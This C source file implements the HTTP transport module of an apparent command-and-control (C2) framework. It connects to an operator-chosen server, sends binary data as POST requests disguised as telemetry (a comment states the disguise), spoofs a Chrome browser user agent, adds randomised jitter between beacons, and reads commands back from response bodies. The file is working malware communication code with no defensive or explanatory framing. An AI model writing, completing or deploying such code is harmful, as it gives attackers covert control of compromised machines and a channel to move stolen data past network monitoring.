#define _POSIX_C_SOURCE 200809L
#include "c2_http.h"
#include "c2.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>

struct http_ctx {
    int         sock;
    char        host[256];
    char        port[16];
    char        user_agent[256];
    char        path[256];
    int         jitter_min;
    int         jitter_max;
    char        extra_headers[1024];
    bool        headers_sent;
};

static c2_err_t http_connect(void *ctx, const char *endpoint) {
    struct http_ctx *h = (struct http_ctx *)ctx;
    if (!h || !endpoint) return C2_ERR;

    char host_buf[256];
    snprintf(host_buf, sizeof(host_buf), "%s", endpoint);

    char *colon = strchr(host_buf, ':');
    if (colon) {
        *colon = '\0';
        snprintf(h->host, sizeof(h->host), "%s", host_buf);
        snprintf(h->port, sizeof(h->port), "%s", colon + 1);
    } else {
        snprintf(h->host, sizeof(h->host), "%s", host_buf);
        snprintf(h->port, sizeof(h->port), "80");
    }

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(h->host, h->port, &hints, &res) != 0)
        return C2_ERR_TRANSPORT;

    h->sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (h->sock < 0) { freeaddrinfo(res); return C2_ERR_TRANSPORT; }

    if (connect(h->sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(h->sock);
        h->sock = -1;
        freeaddrinfo(res);
        return C2_ERR_TRANSPORT;
    }
    freeaddrinfo(res);
    h->headers_sent = false;
    return C2_OK;
}

static void http_sleep_jitter(struct http_ctx *h) {
    if (h->jitter_max > h->jitter_min) {
        int range = h->jitter_max - h->jitter_min;
        int j = h->jitter_min + (int)(rand() % (range + 1));
        struct timespec ts;
        ts.tv_sec = j / 1000;
        ts.tv_nsec = (long)(j % 1000) * 1000000L;
        nanosleep(&ts, NULL);
    }
}

static c2_err_t http_send(void *ctx, const uint8_t *data, size_t len) {
    struct http_ctx *h = (struct http_ctx *)ctx;
    if (!h || h->sock < 0) return C2_ERR_TRANSPORT;

    http_sleep_jitter(h);

    /* 伪装成 telemetry POST 请求 */
    char header[4096];
    int hl = snprintf(header, sizeof(header),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "X-Request-ID: %08x\r\n"
        "%s"
        "Connection: close\r\n"
        "\r\n",
        h->path[0] ? h->path : "/api/v1/telemetry",
        h->host,
        h->user_agent,
        len,
        (unsigned)time(NULL),
        h->extra_headers);

    ssize_t n = send(h->sock, header, (size_t)hl, 0);
    if (n != (ssize_t)hl) return C2_ERR_TRANSPORT;

    size_t sent = 0;
    while (sent < len) {
        n = send(h->sock, data + sent, len - sent, 0);
        if (n <= 0) return C2_ERR_TRANSPORT;
        sent += (size_t)n;
    }
    h->headers_sent = true;
    return C2_OK;
}

static c2_err_t http_recv(void *ctx, uint8_t *buf, size_t *len, int timeout_ms) {
    (void)timeout_ms;
    struct http_ctx *h = (struct http_ctx *)ctx;
    if (!h || h->sock < 0) return C2_ERR_TRANSPORT;

    /* 简单读取响应，定位 \r\n\r\n 后提取 body */
    uint8_t tmp[32768];
    size_t total = 0;
    size_t body_off = 0;
    bool found = false;

    while (total < sizeof(tmp) - 1) {
        ssize_t n = recv(h->sock, tmp + total, sizeof(tmp) - total, 0);
        if (n <= 0) break;
        total += (size_t)n;
        tmp[total] = '\0';

        char *sep = strstr((char *)tmp, "\r\n\r\n");
        if (sep && !found) {
            found = true;
            body_off = (size_t)((uint8_t *)sep - tmp) + 4;
        }
        if (found) {
            /* 读到 Content-Length 指定的字节数就停 */
            char *cl = strstr((char *)tmp, "Content-Length: ");
            size_t need = 0;
            if (cl) need = (size_t)strtoul(cl + 16, NULL, 10);
            if (total - body_off >= need && need > 0) break;
        }
    }

    if (!found) return C2_ERR_PROTO;

    size_t body_len = total - body_off;
    if (body_len > *len) return C2_ERR_NOMEM;
    if (body_len == 0) return C2_ERR_TIMEOUT;

    memcpy(buf, tmp + body_off, body_len);
    *len = body_len;
    return C2_OK;
}

static c2_err_t http_close(void *ctx) {
    struct http_ctx *h = (struct http_ctx *)ctx;
    if (h && h->sock >= 0) {
        close(h->sock);
        h->sock = -1;
    }
    return C2_OK;
}

struct c2_transport *c2_http_transport_create(const char *user_agent,
                                              const char *host_header) {
    struct http_ctx *h = (struct http_ctx *)calloc(1, sizeof(*h));
    if (!h) return NULL;

    h->sock = -1;
    snprintf(h->user_agent, sizeof(h->user_agent), "%s",
             user_agent ? user_agent : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    "Chrome/120.0 Safari/537.36");
    snprintf(h->host, sizeof(h->host), "%s", host_header ? host_header : "");
    h->path[0] = '\0';
    h->jitter_min = 0;
    h->jitter_max = 0;
    h->extra_headers[0] = '\0';
    h->headers_sent = false;

    struct c2_transport *t = (struct c2_transport *)calloc(1, sizeof(*t));
    if (!t) { free(h); return NULL; }

    t->name = "http";
    t->ctx = h;
    t->connect = http_connect;
    t->send = http_send;
    t->recv = http_recv;
    t->close = http_close;
    return t;
}

void c2_http_transport_destroy(struct c2_transport *t) {
    if (!t) return;
    http_close(t->ctx);
    free(t->ctx);
    free(t);
}

c2_err_t c2_http_set_url_path(struct c2_transport *t, const char *path) {
    if (!t || !path) return C2_ERR;
    struct http_ctx *h = (struct http_ctx *)t->ctx;
    snprintf(h->path, sizeof(h->path), "%s", path);
    return C2_OK;
}

c2_err_t c2_http_set_header(struct c2_transport *t,
                            const char *name, const char *value) {
    if (!t || !name || !value) return C2_ERR;
    struct http_ctx *h = (struct http_ctx *)t->ctx;
    size_t cur = strlen(h->extra_headers);
    size_t cap = sizeof(h->extra_headers) - cur;
    if (cap < strlen(name) + strlen(value) + 6) return C2_ERR_NOMEM;
    snprintf(h->extra_headers + cur, cap, "%s: %s\r\n", name, value);
    return C2_OK;
}

c2_err_t c2_http_set_jitter(struct c2_transport *t, int min_ms, int max_ms) {
    if (!t || min_ms < 0 || max_ms < min_ms) return C2_ERR;
    struct http_ctx *h = (struct http_ctx *)t->ctx;
    h->jitter_min = min_ms;
    h->jitter_max = max_ms;
    return C2_OK;
}
